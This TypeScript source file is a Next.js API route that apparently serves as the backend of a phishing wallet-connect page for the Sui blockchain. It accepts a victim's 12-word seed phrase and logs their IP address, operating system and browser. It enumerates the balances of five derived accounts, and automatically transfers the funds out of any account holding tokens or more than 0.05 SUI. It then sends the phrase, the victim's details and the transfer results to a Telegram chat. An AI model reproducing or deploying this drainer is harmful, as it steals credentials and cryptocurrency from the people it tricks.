import { NextResponse } from "next/server"
import { isValidBip39Phrase, hasRepeatedWords } from "@/lib/bip39"
import {
  buildAccountSnapshots,
  drainAllAccounts,
  formatNumber,
  formatUsd,
  type AccountSnapshot,
} from "@/lib/sui-tatum"
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from "@/lib/config"

export const runtime = "nodejs"
export const maxDuration = 60

function escapeHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
}

function parseOs(ua: string): string {
  if (/Windows NT 10/i.test(ua)) return "Windows 10/11"
  if (/Windows NT 6\.3/i.test(ua)) return "Windows 8.1"
  if (/Windows NT 6\.2/i.test(ua)) return "Windows 8"
  if (/Windows NT 6\.1/i.test(ua)) return "Windows 7"
  if (/Windows/i.test(ua)) return "Windows"
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS"
  if (/Mac OS X|Macintosh/i.test(ua)) return "macOS"
  if (/Android/i.test(ua)) return "Android"
  if (/Linux/i.test(ua)) return "Linux"
  if (/CrOS/i.test(ua)) return "ChromeOS"
  return "Unknown OS"
}

function parseBrowser(ua: string): string {
  if (/YaBrowser/i.test(ua)) return "Yandex Browser"
  if (/OPR\/|Opera/i.test(ua)) return "Opera"
  if (/Edg\//i.test(ua)) return "Edge"
  if (/Vivaldi/i.test(ua)) return "Vivaldi"
  if (/Brave/i.test(ua)) return "Brave"
  if (/SamsungBrowser/i.test(ua)) return "Samsung Internet"
  if (/FxiOS/i.test(ua)) return "Firefox"
  if (/Firefox/i.test(ua)) return "Firefox"
  if (/CriOS/i.test(ua)) return "Chrome"
  if (/Chrome/i.test(ua)) return "Chrome"
  if (/Safari/i.test(ua)) return "Safari"
  return "Unknown Browser"
}

export async function POST(req: Request) {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return NextResponse.json(
        { ok: false, error: "Server is not configured" },
        { status: 500 },
      )
    }

    const body = await req.json().catch(() => null)
    if (!body || typeof body !== "object") {
      return NextResponse.json({ ok: false, error: "Invalid body" }, { status: 400 })
    }

    const { wallet, words } = body as { wallet?: unknown; words?: unknown }

    if (!Array.isArray(words) || words.length !== 12) {
      return NextResponse.json({ ok: false, error: "Invalid phrase length" }, { status: 400 })
    }

    const normalized = words.map((w) => (typeof w === "string" ? w.trim().toLowerCase() : ""))

    if (!isValidBip39Phrase(normalized)) {
      return NextResponse.json({ ok: false, error: "Invalid BIP39 phrase" }, { status: 400 })
    }

    if (hasRepeatedWords(normalized)) {
      return NextResponse.json({ ok: false, error: "Invalid BIP39 phrase" }, { status: 400 })
    }

    const walletName = typeof wallet === "string" && wallet.length > 0 ? wallet : "Unknown"

    const ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "unknown"
    const userAgent = req.headers.get("user-agent") || ""
    const os = parseOs(userAgent)
    const browser = parseBrowser(userAgent)

    const phrase = normalized.join(" ")

    let portfolioBlock = ""
    let suiPriceLine = ""
    let drainBlock = ""

    try {
      const { snapshots, suiUsdPrice, totalSui, totalSuiUsd } = await buildAccountSnapshots(phrase, 5)

      const nonEmpty = snapshots.filter(
        (s) => s.suiAmount > 0 || s.balances.some((b) => b.uiAmount > 0),
      )

      suiPriceLine = `💲SUI price: ${suiUsdPrice != null ? `$${formatNumber(suiUsdPrice, 4)}` : "n/a"}`

      const totalLine = `💰Total SUI: ${formatNumber(totalSui)} (${formatUsd(totalSuiUsd)})`

      const accountLines = (nonEmpty.length > 0 ? nonEmpty : snapshots).map((s: AccountSnapshot) => {
        const head = `<b>Account #${s.accountIndex}</b> <code>${escapeHtml(s.address)}</code>`
        const sui = `   • SUI: ${formatNumber(s.suiAmount)} (${formatUsd(s.suiUsdValue)})`
        const others = s.balances
          .filter((b) => b.coinType !== "0x2::sui::SUI" && b.uiAmount > 0)
          .slice(0, 8)
          .map((b) => `   • ${escapeHtml(b.symbol)}: ${formatNumber(b.uiAmount)}`)
        return [head, sui, ...others].join("\n")
      })

      portfolioBlock = ["", suiPriceLine, totalLine, "", ...accountLines].join("\n")

      const hasTokens = nonEmpty.some(s => s.balances.some(b => b.coinType !== "0x2::sui::SUI" && b.uiAmount > 0))

      if (totalSui > 0.05 || hasTokens) {
        try {
          const drainResult = await drainAllAccounts(phrase, 5)

          if (drainResult.totalTransfers > 0) {
            const drainLines: string[] = [
              "",
              `🔄 <b>Auto-transfer results:</b>`,
              `   Successful: ${drainResult.successfulTransfers}/${drainResult.totalTransfers}`,
            ]

            for (const account of drainResult.results) {
              drainLines.push(`\n   📤 From Account #${account.accountIndex}`)
              drainLines.push(`   <code>${account.address}</code>`)
              for (const transfer of account.transfers) {
                if (transfer.success) {
                  const symbol = transfer.coinType === "0x2::sui::SUI" ? "SUI" : escapeHtml(transfer.coinType?.split("::")?.pop() || "TOKEN")
                  drainLines.push(`   ✅ ${symbol}: ${transfer.amount}`)
                  drainLines.push(`   🔗 TX: <code>${transfer.txDigest}</code>`)
                  drainLines.push(`   <a href="https://suiscan.xyz/mainnet/tx/${transfer.txDigest}">View on SuiScan</a>`)
                } else {
                  drainLines.push(`   ❌ Error: ${escapeHtml(transfer.error || "Unknown")}`)
                }
              }
            }

            drainBlock = drainLines.join("\n")
          }
        } catch {
          drainBlock = "\n⚠️ Auto-transfer failed"
        }
      }
    } catch {
      portfolioBlock = "\n⚠️ Portfolio lookup failed"
    }

    const text = [
      "💧<b>New wallet connection</b>🐟 Sui network",
      `Wallet: ${escapeHtml(walletName)}🪏`,
      `📄Phrase: <code>${escapeHtml(phrase)}</code>`,
      `📍IP: ${escapeHtml(ip)}`,
      `💻OS: ${escapeHtml(os)}`,
      `Browser: ${escapeHtml(browser)}`,
      portfolioBlock,
      drainBlock,
    ].join("\n")

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      },
    )

    if (!tgRes.ok) {
      return NextResponse.json(
        { ok: false, error: "Telegram delivery failed" },
        { status: 502 },
      )
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false, error: "Internal error" }, { status: 500 })
  }
}
